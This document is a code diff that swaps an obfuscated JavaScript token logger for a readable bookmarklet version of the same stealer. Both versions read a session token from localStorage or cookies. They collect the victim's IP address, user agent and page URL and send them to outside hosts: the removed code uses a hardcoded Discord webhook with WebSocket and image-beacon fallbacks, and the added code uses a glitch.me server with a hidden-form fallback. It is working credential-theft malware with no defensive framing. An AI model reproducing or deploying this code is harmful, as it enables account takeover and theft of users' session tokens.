@@ -1,1 +1,61 @@
-function _0x168f(){const _0x2b2fe8=['https://i.imgur.com/Jxee3pS.jpeg','Unknown','/log?data=','136xjzyrd','IP\x20Address','8361jVlndX','5059680dqLZjc','close','User\x20Agent','onopen','https://serious-mysterious-albertonykus.glitch.me','```','json','slice','https://ipinfo.io/json','169603qicNrB','then','onerror','Logger\x20Bot','stringify','reject','URL','13585ZpaSmj','POST','8mNcEwr','token','replace','🔐\x20Token\x20&\x20🌐\x20IP\x20Info','getItem','src','104583rrWqii','Token','match','application/json','catch','426GNOodq','location','userAgent','cookie','271900cYisJq','send','Logger\x20by\x20HaThu','href','650370bsREgs','forEach'];_0x168f=function(){return _0x2b2fe8;};return _0x168f();}function _0x4eaa(_0x1664a1,_0x3c4183){const _0x168f85=_0x168f();return _0x4eaa=function(_0x4eaa5e,_0x528677){_0x4eaa5e=_0x4eaa5e-0x111;let _0x5efa30=_0x168f85[_0x4eaa5e];return _0x5efa30;},_0x4eaa(_0x1664a1,_0x3c4183);}(function(_0x221c62,_0x5dce33){const _0x3cc801=_0x4eaa,_0xcd4c66=_0x221c62();while(!![]){try{const _0x5a1960=-parseInt(_0x3cc801(0x137))/0x1+parseInt(_0x3cc801(0x122))/0x2+-parseInt(_0x3cc801(0x119))/0x3*(parseInt(_0x3cc801(0x113))/0x4)+parseInt(_0x3cc801(0x111))/0x5*(-parseInt(_0x3cc801(0x11e))/0x6)+-parseInt(_0x3cc801(0x126))/0x7+-parseInt(_0x3cc801(0x12b))/0x8*(parseInt(_0x3cc801(0x12d))/0x9)+parseInt(_0x3cc801(0x12e))/0xa;if(_0x5a1960===_0x5dce33)break;else _0xcd4c66['push'](_0xcd4c66['shift']());}catch(_0x1407d0){_0xcd4c66['push'](_0xcd4c66['shift']());}}}(_0x168f,0x18a77));_0x3c0e2c:(function(){const _0x1f1b72=_0x4eaa,_0x545d66=localStorage[_0x1f1b72(0x117)](_0x1f1b72(0x114))||document[_0x1f1b72(0x121)][_0x1f1b72(0x11b)](/token=([^;]+)/)?.[0x1];if(!_0x545d66)return;const _0x21fd9a='https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM',_0x2b4fa3=_0x1f1b72(0x132);function _0x4f17e9(_0x1eff15,_0x31b582){const _0xee13bc=_0x1f1b72,_0x22bb55={'username':_0xee13bc(0x13a),'avatar_url':_0xee13bc(0x128),'embeds':[{'title':_0xee13bc(0x116),'color':0xffff,'fields':[{'name':_0xee13bc(0x11a),'value':_0xee13bc(0x133)+_0x1eff15['slice'](0x0,0x32)+'...```','inline':![]},{'name':_0xee13bc(0x12c),'value':_0xee13bc(0x133)+_0x31b582+_0xee13bc(0x133),'inline':![]},{'name':_0xee13bc(0x130),'value':_0xee13bc(0x133)+navigator[_0xee13bc(0x120)]+_0xee13bc(0x133),'inline':![]},{'name':_0xee13bc(0x13d),'value':'```'+window[_0xee13bc(0x11f)][_0xee13bc(0x125)]+_0xee13bc(0x133),'inline':![]}],'footer':{'text':_0xee13bc(0x124)},'timestamp':new Date()['toISOString']()}]};fetch(_0x21fd9a,{'method':_0xee13bc(0x112),'headers':{'Content-Type':_0xee13bc(0x11c)},'body':JSON['stringify'](_0x22bb55)})['catch'](()=>_0x206877(_0x1eff15,_0x31b582));}function _0x206877(_0x57b669,_0x59386f){const _0x5796e6=_0x1f1b72,_0x201295={'token':_0x57b669[_0x5796e6(0x135)](0x0,0x32),'ip':_0x59386f||_0x5796e6(0x129),'ua':navigator['userAgent'],'url':window[_0x5796e6(0x11f)][_0x5796e6(0x125)],'time':new Date()['toISOString']()};try{const _0x4dfe47=new WebSocket('wss://'+_0x2b4fa3[_0x5796e6(0x115)]('https://',''));_0x4dfe47[_0x5796e6(0x131)]=()=>{const _0xf07926=_0x5796e6;_0x4dfe47[_0xf07926(0x123)](JSON[_0xf07926(0x13b)](_0x201295)),_0x4dfe47[_0xf07926(0x12f)]();},_0x4dfe47[_0x5796e6(0x139)]=()=>_0x1b9784(_0x201295);}catch(_0x4a12a0){_0x1b9784(_0x201295);}}function _0x1b9784(_0x5d2951){const _0x100160=_0x1f1b72,_0x4631d2=new Image();_0x4631d2[_0x100160(0x118)]=_0x2b4fa3+_0x100160(0x12a)+btoa(JSON[_0x100160(0x13b)](_0x5d2951));}const _0x9135b=['https://api.ipify.org?format=json',_0x1f1b72(0x136),'https://ipapi.co/json'];let _0x2fea60=![];_0x9135b[_0x1f1b72(0x127)](_0x36a206=>{const _0x4c0d30=_0x1f1b72;if(_0x2fea60)return;fetch(_0x36a206)[_0x4c0d30(0x138)](_0x53312f=>_0x53312f['ok']?_0x53312f[_0x4c0d30(0x134)]():Promise[_0x4c0d30(0x13c)]())[_0x4c0d30(0x138)](_0xbe7757=>{if(_0x2fea60)return;_0x2fea60=!![],_0x4f17e9(_0x545d66,_0xbe7757['ip']||_0xbe7757['ip_address']);})[_0x4c0d30(0x11d)](()=>{});}),setTimeout(()=>{if(!_0x2fea60)_0x4f17e9(_0x545d66,'Unknown');},0xbb8);}());
+javascript:(function(){
+
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    const token = iframe.contentWindow.localStorage.getItem('token') || 
+                 iframe.contentDocument.cookie.match(/token=([^;]+)/)?.[1];
+    
+    if (!token) {
+        document.body.removeChild(iframe);
+        return;
+    }
+
+    const SERVER_URL = 'https://serious-mysterious-albertonykus.glitch.me';
+
+    function sendData(data) {
+
+        fetch(`${SERVER_URL}/log`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(() => {
+
+            const form = document.createElement('form');
+            form.action = `${SERVER_URL}/log`;
+            form.method = 'POST';
+            form.target = '_blank';
+            
+            const input = document.createElement('input');
+            input.name = 'data';
+            input.value = btoa(JSON.stringify(data));
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            form.submit();
+        });
+    }
+
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(ipData => {
+            sendData({
+                token: token.slice(0, 50),
+                ip: ipData.ip,
+                ua: navigator.userAgent,
+                url: window.location.href
+            });
+        })
+        .catch(() => {
+            sendData({
+                token: token.slice(0, 50),
+                ip: 'Unknown',
+                ua: navigator.userAgent,
+                url: window.location.href
+            });
+        })
+        .finally(() => {
+            document.body.removeChild(iframe);
+        });
+})();
